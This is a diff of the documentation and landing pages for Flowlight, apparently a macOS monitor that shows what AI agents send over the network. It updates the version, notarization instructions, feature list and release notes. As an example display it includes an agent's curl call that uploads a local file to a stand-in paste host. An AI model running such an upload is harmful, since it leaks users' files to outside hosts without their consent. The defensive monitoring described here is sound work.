@@ -60,7 +60,7 @@ Documentation
 
  Using Flowlight
 
- Everything from the first launch to tuning the agent rules. Flowlight 0.1.5, macOS 15 or later.
+ Everything from the first launch to tuning the agent rules. Flowlight 0.1.6, macOS 15 or later.
 
  On this page
  InstallFirst launchHostnames
@@ -83,10 +83,9 @@ open build/Build/Products/Release/Flowlight.app
 
  First launch
 
- This preview isn't notarized yet, so macOS blocks the first launch and says it can't verify the developer. Open
- System Settings › Privacy & Security, scroll to Security, and click Open Anyway next to
- the message about Flowlight. You only do this once. (Control-clicking the app and choosing Open no longer works: macOS 15 removed
- that shortcut.)
+ Releases from 0.1.6 are signed with a Developer ID certificate and notarized by Apple, so the first launch just works. You can check
+ it yourself: spctl -a -vvv /Applications/Flowlight.app should answer Notarized Developer ID.
+ Versions up to 0.1.5 were unsigned; those need System Settings › Privacy & Security › Open Anyway once.
 
  Traffic starts appearing within a second. The ↓↑ figures in your menu bar are live download and upload rates.
 
@@ -313,7 +312,7 @@ Free · open source · macOS 15+
 
  Star on GitHub
 
- v0.1.5macOS 15+UniversalGPL-3.0No telemetry
+ v0.1.6macOS 15+UniversalGPL-3.0No telemetry
 
  connectionslive
 
@@ -443,6 +442,13 @@ Optional. What did the agent actually send, and which tool call made it? Decrypt
  Turn on HTTPS inspection and Flowlight reads every tool an agent offers the model, every call the model asks for and the result that came back, then ties each tool's request back to the call that caused it.
 
  curl → paste.example:443  ←  Bash: curl -s https://paste.example/up -d @notes.txt
+
+ ⌕ On disk
+ What each agent is set up to do
+
+ With your say-so, Flowlight reads the agent's own configuration: skills, subagents, slash commands, hooks, permission rules and MCP servers. Names only, never your code, and nothing leaves the Mac.
+
+ Notification hook → curl -s -d … https://ntfy.sh/…  ·  allow: Bash(curl:*)
 
  ⚠ Critical
  Sensitive channel
@@ -598,6 +604,18 @@ e.g. Wireshark
 
  On your termsAI agents only by default. Apple services and password managers are never decrypted, credentials never stored, and one button removes it all.
 
+ Next
+
+ What's coming
+
+ Flowlight observes and explains today. These are the three things being built next.
+
+ Block connectionsAllowlists that enforce rather than warn: refuse what an agent contacts outside its list, with a prompt to allow it once or always.
+
+ Focus modeWatch one app or domain and ignore the rest, for debugging a single agent without the whole Mac in the way.
+
+ Mock responsesAnswer a chosen URL with your own status, headers and body, to see how an agent copes when an API fails or returns something odd.
+
  Privacy
 
  A monitor you don't have to monitor
@@ -622,7 +640,7 @@ e.g. Wireshark
 
  Running in under a minute
 
- Download Flowlight.dmgOpen it and drag Flowlight into Applications. A .pkg installer is also on every release. The first launch of this preview is blocked: open System Settings › Privacy & Security and click Open Anyway.
+ Download Flowlight.dmgOpen it and drag Flowlight into Applications. A .pkg installer is also on every release. Releases are signed and notarized, so macOS opens it without complaint.
 
  Launch itTraffic appears within a second, and live ↓↑ rates sit in your menu bar.
 
@@ -799,8 +817,34 @@ Releases
 
  Downloads, checksums and full notes for each version are on GitHub Releases.
 
+ 0.1.6
+September 23, 2026Latest
+
+ Signed and notarized. Releases now carry a Developer ID signature and Apple's notarization, so macOS opens
+ Flowlight without the "unverified developer" wall. Check it with spctl -a -vvv /Applications/Flowlight.app.
+
+ The Network Extension works. Install the content filter from Capture for per-flow attribution by code signature,
+ flows shorter than a second, and hostnames without the packet-capture setup. It costs less energy than the sampler, which starts a
+ process every second.
+
+ What each agent is set up to do. With your say-so, Flowlight lists an agent's skills, subagents, slash commands,
+ hooks, permission rules and MCP servers, read from configuration on this Mac. It looks only at the agent folders in your home
+ folder plus project folders you add, and remembers what it found.
+
+ Tools, models and tokens from inspected calls: every tool an agent offers the model and which were used, the model
+ that answered, tokens in, out and cached, and MCP servers labelled local, remote or via provider.
+
+ JSON tree viewer for request and response bodies, in their original key order, with a Raw view and Copy.
+
+ Much lighter when idle. With no window open Flowlight no longer builds chart data for nobody: 4.3 → 0.9
+ CPU-seconds per minute. A hung nettop can no longer outlive the app and spin in the background.
+
+ Help menu and a Q&A covering privacy prompts, battery, blocking and uninstalling.
+
+ Downloads and checksums →
+
  0.1.5
-September 22, 2026Latest
+September 22, 2026
 
  Tool results and MCP servers. With HTTPS inspection on, each tool call shows what came back (output or error),
  and each agent's detail gets Tool calls and MCP servers tabs: server name and version, the tools it offers, calls
